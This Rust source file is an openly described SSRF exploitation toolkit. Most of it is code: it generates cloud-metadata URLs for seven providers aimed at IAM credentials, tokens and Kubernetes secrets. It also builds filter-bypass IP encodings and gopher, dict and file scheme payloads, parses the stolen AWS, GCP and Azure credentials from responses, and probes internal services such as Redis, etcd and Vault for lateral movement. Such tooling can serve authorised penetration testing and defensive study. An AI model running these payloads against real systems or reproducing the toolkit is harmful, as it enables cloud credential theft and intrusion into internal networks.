use std::fmt;
use std::net::Ipv4Addr;

/// SSRF chain automation: from initial SSRF to cloud credential extraction
/// and lateral movement.
///
/// The attack chain: discover SSRF → enumerate cloud metadata → extract
/// credentials → use credentials for lateral movement. This module
/// generates the complete payload set and parses responses at each stage.

/// Cloud provider whose metadata service we're targeting.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum CloudProvider {
    Aws,
    Gcp,
    Azure,
    DigitalOcean,
    Alibaba,
    Oracle,
    Kubernetes,
}

impl fmt::Display for CloudProvider {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Aws => write!(f, "AWS"),
            Self::Gcp => write!(f, "GCP"),
            Self::Azure => write!(f, "Azure"),
            Self::DigitalOcean => write!(f, "DigitalOcean"),
            Self::Alibaba => write!(f, "Alibaba"),
            Self::Oracle => write!(f, "Oracle"),
            Self::Kubernetes => write!(f, "Kubernetes"),
        }
    }
}

/// URL scheme for SSRF exploitation — not all targets filter all schemes.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum SsrfScheme {
    Http,
    Https,
    Gopher,
    Dict,
    File,
    Ftp,
    Tftp,
    Ldap,
}

impl fmt::Display for SsrfScheme {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Http => write!(f, "http"),
            Self::Https => write!(f, "https"),
            Self::Gopher => write!(f, "gopher"),
            Self::Dict => write!(f, "dict"),
            Self::File => write!(f, "file"),
            Self::Ftp => write!(f, "ftp"),
            Self::Tftp => write!(f, "tftp"),
            Self::Ldap => write!(f, "ldap"),
        }
    }
}

/// A generated SSRF payload with metadata.
#[derive(Debug, Clone)]
pub struct SsrfPayload {
    pub url: String,
    pub target: SsrfTarget,
    pub bypass_technique: Option<String>,
    pub required_headers: Vec<(String, String)>,
    pub description: String,
}

/// What the SSRF payload is targeting.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SsrfTarget {
    CloudMetadata(CloudProvider),
    InternalService { host: String, port: u16 },
    LocalFile(String),
    DnsRebinding,
}

impl fmt::Display for SsrfTarget {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::CloudMetadata(p) => write!(f, "{} metadata", p),
            Self::InternalService { host, port } => write!(f, "internal {}:{}", host, port),
            Self::LocalFile(path) => write!(f, "file://{}", path),
            Self::DnsRebinding => write!(f, "DNS rebinding"),
        }
    }
}

/// Generate metadata endpoint payloads for all cloud providers.
pub fn generate_metadata_payloads() -> Vec<SsrfPayload> {
    let mut payloads = Vec::new();
    payloads.extend(aws_metadata_payloads());
    payloads.extend(gcp_metadata_payloads());
    payloads.extend(azure_metadata_payloads());
    payloads.extend(digitalocean_metadata_payloads());
    payloads.extend(alibaba_metadata_payloads());
    payloads.extend(oracle_metadata_payloads());
    payloads.extend(kubernetes_metadata_payloads());
    payloads
}

fn aws_metadata_payloads() -> Vec<SsrfPayload> {
    let base_paths = [
        ("/latest/meta-data/", "instance metadata root"),
        ("/latest/meta-data/iam/security-credentials/", "IAM role listing"),
        ("/latest/meta-data/iam/info", "IAM info"),
        ("/latest/meta-data/hostname", "internal hostname"),
        ("/latest/meta-data/local-ipv4", "internal IPv4"),
        ("/latest/meta-data/public-keys/", "SSH public keys"),
        ("/latest/user-data", "instance user-data (may contain secrets)"),
        ("/latest/dynamic/instance-identity/document", "instance identity"),
        ("/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance", "EC2 instance creds"),
    ];

    let metadata_ip = "169.254.169.254";

    let mut payloads: Vec<SsrfPayload> = base_paths
        .iter()
        .map(|(path, desc)| SsrfPayload {
            url: format!("http://{}{}", metadata_ip, path),
            target: SsrfTarget::CloudMetadata(CloudProvider::Aws),
            bypass_technique: None,
            required_headers: Vec::new(),
            description: desc.to_string(),
        })
        .collect();

    payloads.push(SsrfPayload {
        url: format!(
            "http://{}/latest/api/token",
            metadata_ip
        ),
        target: SsrfTarget::CloudMetadata(CloudProvider::Aws),
        bypass_technique: Some("IMDSv2 token request".to_string()),
        required_headers: vec![
            ("X-aws-ec2-metadata-token-ttl-seconds".to_string(), "21600".to_string()),
        ],
        description: "IMDSv2 token acquisition (PUT required)".to_string(),
    });

    payloads
}

fn gcp_metadata_payloads() -> Vec<SsrfPayload> {
    let base_paths = [
        ("/computeMetadata/v1/instance/service-accounts/default/token", "GCP access token"),
        ("/computeMetadata/v1/instance/service-accounts/default/email", "service account email"),
        ("/computeMetadata/v1/instance/service-accounts/default/scopes", "service account scopes"),
        ("/computeMetadata/v1/project/project-id", "project ID"),
        ("/computeMetadata/v1/instance/hostname", "instance hostname"),
        ("/computeMetadata/v1/instance/attributes/kube-env", "Kubernetes environment"),
        ("/computeMetadata/v1/instance/attributes/ssh-keys", "SSH keys"),
    ];

    base_paths
        .iter()
        .map(|(path, desc)| SsrfPayload {
            url: format!("http://metadata.google.internal{}", path),
            target: SsrfTarget::CloudMetadata(CloudProvider::Gcp),
            bypass_technique: None,
            required_headers: vec![
                ("Metadata-Flavor".to_string(), "Google".to_string()),
            ],
            description: desc.to_string(),
        })
        .collect()
}

fn azure_metadata_payloads() -> Vec<SsrfPayload> {
    let base_paths = [
        ("/metadata/instance?api-version=2021-02-01", "instance metadata"),
        ("/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "managed identity token"),
        ("/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text", "subscription ID"),
        ("/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2021-02-01&format=text", "public IP"),
    ];

    base_paths
        .iter()
        .map(|(path, desc)| SsrfPayload {
            url: format!("http://169.254.169.254{}", path),
            target: SsrfTarget::CloudMetadata(CloudProvider::Azure),
            bypass_technique: None,
            required_headers: vec![
                ("Metadata".to_string(), "true".to_string()),
            ],
            description: desc.to_string(),
        })
        .collect()
}

fn digitalocean_metadata_payloads() -> Vec<SsrfPayload> {
    vec![
        SsrfPayload {
            url: "http://169.254.169.254/metadata/v1.json".to_string(),
            target: SsrfTarget::CloudMetadata(CloudProvider::DigitalOcean),
            bypass_technique: None,
            required_headers: Vec::new(),
            description: "full metadata JSON".to_string(),
        },
        SsrfPayload {
            url: "http://169.254.169.254/metadata/v1/hostname".to_string(),
            target: SsrfTarget::CloudMetadata(CloudProvider::DigitalOcean),
            bypass_technique: None,
            required_headers: Vec::new(),
            description: "droplet hostname".to_string(),
        },
    ]
}

fn alibaba_metadata_payloads() -> Vec<SsrfPayload> {
    vec![
        SsrfPayload {
            url: "http://100.100.100.200/latest/meta-data/".to_string(),
            target: SsrfTarget::CloudMetadata(CloudProvider::Alibaba),
            bypass_technique: None,
            required_headers: Vec::new(),
            description: "Alibaba Cloud metadata root".to_string(),
        },
        SsrfPayload {
            url: "http://100.100.100.200/latest/meta-data/ram/security-credentials/".to_string(),
            target: SsrfTarget::CloudMetadata(CloudProvider::Alibaba),
            bypass_technique: None,
            required_headers: Vec::new(),
            description: "Alibaba RAM security credentials".to_string(),
        },
    ]
}

fn oracle_metadata_payloads() -> Vec<SsrfPayload> {
    vec![
        SsrfPayload {
            url: "http://169.254.169.254/opc/v2/instance/".to_string(),
            target: SsrfTarget::CloudMetadata(CloudProvider::Oracle),
            bypass_technique: None,
            required_headers: vec![
                ("Authorization".to_string(), "Bearer Oracle".to_string()),
            ],
            description: "Oracle Cloud instance metadata".to_string(),
        },
    ]
}

fn kubernetes_metadata_payloads() -> Vec<SsrfPayload> {
    vec![
        SsrfPayload {
            url: "https://kubernetes.default.svc/api/v1/namespaces".to_string(),
            target: SsrfTarget::CloudMetadata(CloudProvider::Kubernetes),
            bypass_technique: None,
            required_headers: Vec::new(),
            description: "Kubernetes API namespace listing".to_string(),
        },
        SsrfPayload {
            url: "https://kubernetes.default.svc/api/v1/secrets".to_string(),
            target: SsrfTarget::CloudMetadata(CloudProvider::Kubernetes),
            bypass_technique: None,
            required_headers: Vec::new(),
            description: "Kubernetes secrets listing".to_string(),
        },
        SsrfPayload {
            url: "https://kubernetes.default.svc/api/v1/pods".to_string(),
            target: SsrfTarget::CloudMetadata(CloudProvider::Kubernetes),
            bypass_technique: None,
            required_headers: Vec::new(),
            description: "Kubernetes pods listing".to_string(),
        },
    ]
}

/// Generate IP representation bypass payloads for a target IP.
///
/// WAF/SSRF filters often check for "169.254.169.254" as a string,
/// but many HTTP libraries resolve alternate representations to the
/// same address.
pub fn generate_ip_bypasses(ip: Ipv4Addr) -> Vec<String> {
    let octets = ip.octets();

    let decimal = u32::from(ip);

    let hex = format!("0x{:02x}.0x{:02x}.0x{:02x}.0x{:02x}",
        octets[0], octets[1], octets[2], octets[3]);

    let hex_full = format!("0x{:08x}", decimal);

    let octal = format!("0{:o}.0{:o}.0{:o}.0{:o}",
        octets[0], octets[1], octets[2], octets[3]);

    let ipv6_mapped = format!("[::{}.{}.{}.{}]",
        octets[0], octets[1], octets[2], octets[3]);

    let ipv6_mapped_hex = format!("[::ffff:{:02x}{:02x}:{:02x}{:02x}]",
        octets[0], octets[1], octets[2], octets[3]);

    let mixed_notation = format!("{}.{}.{}",
        octets[0],
        octets[1],
        (octets[2] as u32) * 256 + octets[3] as u32,
    );

    let two_part = format!("{}.{}",
        octets[0],
        (octets[1] as u32) * 65536 + (octets[2] as u32) * 256 + octets[3] as u32,
    );

    vec![
        ip.to_string(),
        decimal.to_string(),
        hex,
        hex_full,
        octal,
        ipv6_mapped,
        ipv6_mapped_hex,
        mixed_notation,
        two_part,
        format!("0177.0.0.1"),
        format!("{}.xip.io", ip),
        format!("{}.nip.io", ip),
    ]
}

/// Generate URL scheme bypass payloads for a given path.
///
/// Some SSRF filters only block http:// but allow gopher://, dict://,
/// file:// etc. Each scheme has different exploitation potential.
pub fn generate_scheme_payloads(internal_host: &str, path: &str) -> Vec<SsrfPayload> {
    vec![
        SsrfPayload {
            url: format!("http://{}{}", internal_host, path),
            target: SsrfTarget::InternalService {
                host: internal_host.to_string(),
                port: 80,
            },
            bypass_technique: None,
            required_headers: Vec::new(),
            description: "standard HTTP".to_string(),
        },
        SsrfPayload {
            url: format!("https://{}{}", internal_host, path),
            target: SsrfTarget::InternalService {
                host: internal_host.to_string(),
                port: 443,
            },
            bypass_technique: Some("HTTPS scheme".to_string()),
            required_headers: Vec::new(),
            description: "HTTPS (may bypass HTTP-only filters)".to_string(),
        },
        SsrfPayload {
            url: format!("gopher://{}:80/_GET%20{}%20HTTP/1.1%0d%0aHost:%20{}%0d%0a%0d%0a",
                internal_host, path, internal_host),
            target: SsrfTarget::InternalService {
                host: internal_host.to_string(),
                port: 80,
            },
            bypass_technique: Some("gopher:// scheme".to_string()),
            required_headers: Vec::new(),
            description: "gopher protocol — raw TCP via URL".to_string(),
        },
        SsrfPayload {
            url: format!("dict://{}:11211/stat", internal_host),
            target: SsrfTarget::InternalService {
                host: internal_host.to_string(),
                port: 11211,
            },
            bypass_technique: Some("dict:// scheme".to_string()),
            required_headers: Vec::new(),
            description: "dict protocol — target memcached".to_string(),
        },
        SsrfPayload {
            url: format!("file://{}", path),
            target: SsrfTarget::LocalFile(path.to_string()),
            bypass_technique: Some("file:// scheme".to_string()),
            required_headers: Vec::new(),
            description: "local file read".to_string(),
        },
    ]
}

/// Extract AWS credentials from an IAM security-credentials response.
///
/// AWS metadata returns JSON like:
/// ```json
/// {
///   "AccessKeyId": "AKIA...",
///   "SecretAccessKey": "...",
///   "Token": "...",
///   "Expiration": "..."
/// }
/// ```
pub fn extract_aws_credentials(response_body: &str) -> Option<AwsCredentials> {
    let v: serde_json::Value = serde_json::from_str(response_body).ok()?;

    let access_key = v.get("AccessKeyId")?.as_str()?.to_string();
    let secret_key = v.get("SecretAccessKey")?.as_str()?.to_string();
    let token = v.get("Token").and_then(|t| t.as_str()).map(|s| s.to_string());
    let expiration = v.get("Expiration").and_then(|e| e.as_str()).map(|s| s.to_string());

    Some(AwsCredentials {
        access_key_id: access_key,
        secret_access_key: secret_key,
        session_token: token,
        expiration,
    })
}

/// Extract GCP access token from metadata response.
///
/// GCP returns:
/// ```json
/// {
///   "access_token": "ya29.c...",
///   "expires_in": 3600,
///   "token_type": "Bearer"
/// }
/// ```
pub fn extract_gcp_token(response_body: &str) -> Option<GcpToken> {
    let v: serde_json::Value = serde_json::from_str(response_body).ok()?;

    let access_token = v.get("access_token")?.as_str()?.to_string();
    let expires_in = v.get("expires_in").and_then(|e| e.as_u64());
    let token_type = v.get("token_type").and_then(|t| t.as_str()).map(|s| s.to_string());

    Some(GcpToken {
        access_token,
        expires_in,
        token_type,
    })
}

/// Extract Azure managed identity token from metadata response.
pub fn extract_azure_token(response_body: &str) -> Option<AzureToken> {
    let v: serde_json::Value = serde_json::from_str(response_body).ok()?;

    let access_token = v.get("access_token")?.as_str()?.to_string();
    let token_type = v.get("token_type").and_then(|t| t.as_str()).map(|s| s.to_string());
    let resource = v.get("resource").and_then(|r| r.as_str()).map(|s| s.to_string());
    let expires_on = v.get("expires_on").and_then(|e| e.as_str()).map(|s| s.to_string());

    Some(AzureToken {
        access_token,
        token_type,
        resource,
        expires_on,
    })
}

/// Extracted AWS IAM credentials.
#[derive(Debug, Clone)]
pub struct AwsCredentials {
    pub access_key_id: String,
    pub secret_access_key: String,
    pub session_token: Option<String>,
    pub expiration: Option<String>,
}

/// Extracted GCP access token.
#[derive(Debug, Clone)]
pub struct GcpToken {
    pub access_token: String,
    pub expires_in: Option<u64>,
    pub token_type: Option<String>,
}

/// Extracted Azure managed identity token.
#[derive(Debug, Clone)]
pub struct AzureToken {
    pub access_token: String,
    pub token_type: Option<String>,
    pub resource: Option<String>,
    pub expires_on: Option<String>,
}

/// Stages in the SSRF exploitation chain.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SsrfChainStage {
    Discovery,
    MetadataAccess,
    CredentialExtraction,
    LateralMovement,
}

impl fmt::Display for SsrfChainStage {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Discovery => write!(f, "SSRF_DISCOVERY"),
            Self::MetadataAccess => write!(f, "METADATA_ACCESS"),
            Self::CredentialExtraction => write!(f, "CREDENTIAL_EXTRACTION"),
            Self::LateralMovement => write!(f, "LATERAL_MOVEMENT"),
        }
    }
}

/// A step in the SSRF attack chain.
#[derive(Debug, Clone)]
pub struct ChainStep {
    pub stage: SsrfChainStage,
    pub payload: SsrfPayload,
    pub expected_indicators: Vec<String>,
    pub next_step_generator: Option<String>,
}

/// Generate the initial SSRF discovery probes.
///
/// These are the first payloads to test: probe the metadata IP with
/// various bypass techniques to determine if SSRF exists and which
/// representations work.
pub fn generate_discovery_chain(target_param: &str) -> Vec<ChainStep> {
    let metadata_ip: Ipv4Addr = Ipv4Addr::new(169, 254, 169, 254);
    let ip_variants = generate_ip_bypasses(metadata_ip);

    ip_variants
        .into_iter()
        .map(|ip_repr| ChainStep {
            stage: SsrfChainStage::Discovery,
            payload: SsrfPayload {
                url: format!("http://{}/latest/meta-data/", ip_repr),
                target: SsrfTarget::CloudMetadata(CloudProvider::Aws),
                bypass_technique: Some(format!("IP representation: {}", ip_repr)),
                required_headers: Vec::new(),
                description: format!("AWS metadata via {} on param={}", ip_repr, target_param),
            },
            expected_indicators: vec![
                "ami-id".to_string(),
                "instance-id".to_string(),
                "security-credentials".to_string(),
            ],
            next_step_generator: Some("aws_credential_chain".to_string()),
        })
        .collect()
}

/// Detect which cloud provider is running based on metadata response.
pub fn detect_cloud_provider(response_body: &str) -> Option<CloudProvider> {
    if response_body.contains("ami-id") || response_body.contains("instance-id") {
        return Some(CloudProvider::Aws);
    }
    if response_body.contains("computeMetadata") || response_body.contains("google") {
        return Some(CloudProvider::Gcp);
    }
    if response_body.contains("subscriptionId") || response_body.contains("azEnvironment") {
        return Some(CloudProvider::Azure);
    }
    if response_body.contains("droplet_id") {
        return Some(CloudProvider::DigitalOcean);
    }
    if response_body.contains("region-id") && response_body.contains("zone-id") {
        return Some(CloudProvider::Alibaba);
    }
    None
}

/// Generate the AWS credential extraction chain.
///
/// Step 1: GET /latest/meta-data/iam/security-credentials/ → list role names
/// Step 2: GET /latest/meta-data/iam/security-credentials/{role_name} → credentials JSON
pub fn aws_credential_chain(role_name: &str) -> Vec<ChainStep> {
    vec![
        ChainStep {
            stage: SsrfChainStage::CredentialExtraction,
            payload: SsrfPayload {
                url: format!(
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/{}",
                    role_name
                ),
                target: SsrfTarget::CloudMetadata(CloudProvider::Aws),
                bypass_technique: None,
                required_headers: Vec::new(),
                description: format!("extract credentials for IAM role: {}", role_name),
            },
            expected_indicators: vec![
                "AccessKeyId".to_string(),
                "SecretAccessKey".to_string(),
                "Token".to_string(),
            ],
            next_step_generator: Some("lateral_movement".to_string()),
        },
    ]
}

/// Common internal services to probe via SSRF for lateral movement.
pub fn internal_service_probes() -> Vec<SsrfPayload> {
    let services = [
        ("127.0.0.1", 6379, "Redis"),
        ("127.0.0.1", 11211, "Memcached"),
        ("127.0.0.1", 27017, "MongoDB"),
        ("127.0.0.1", 9200, "Elasticsearch"),
        ("127.0.0.1", 5432, "PostgreSQL"),
        ("127.0.0.1", 3306, "MySQL"),
        ("127.0.0.1", 8080, "Internal HTTP"),
        ("127.0.0.1", 8443, "Internal HTTPS"),
        ("127.0.0.1", 2379, "etcd"),
        ("127.0.0.1", 10250, "Kubelet"),
        ("127.0.0.1", 4040, "Spark UI"),
        ("127.0.0.1", 8888, "Jupyter"),
        ("127.0.0.1", 15672, "RabbitMQ Management"),
        ("127.0.0.1", 9090, "Prometheus"),
        ("127.0.0.1", 3000, "Grafana"),
        ("127.0.0.1", 8500, "Consul"),
        ("127.0.0.1", 8200, "Vault"),
    ];

    services
        .iter()
        .map(|(host, port, name)| SsrfPayload {
            url: format!("http://{}:{}/", host, port),
            target: SsrfTarget::InternalService {
                host: host.to_string(),
                port: *port,
            },
            bypass_technique: None,
            required_headers: Vec::new(),
            description: format!("{} on port {}", name, port),
        })
        .collect()
}

/// Count total payloads across all cloud providers.
pub fn total_metadata_payload_count() -> usize {
    generate_metadata_payloads().len()
}

#[cfg(test)]
#[path = "ssrf_chain_test.rs"]
mod ssrf_chain_test;
